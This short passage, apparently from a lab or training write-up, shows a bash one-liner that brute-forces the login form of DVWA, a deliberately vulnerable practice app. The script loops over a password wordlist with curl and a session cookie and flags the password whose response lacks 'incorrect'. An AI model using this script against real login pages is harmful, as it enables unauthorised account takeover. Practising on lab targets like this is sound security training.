...
**The Script:**
```bash
for pass in $(cat parole.txt); do rezultat=$(curl -s -b "PHPSESSID=[COOKIE]; security=low" "http://[IP]/dvwa/vulnerabilities/brute/?username=admin&password=$pass&Login=Login"); if echo "$rezultat" | grep -q "incorrect"; then echo "[-] $pass -> incorrect"; else echo -e "\e[32m[+] Correct password is: $pass\e[0m"; fi; done
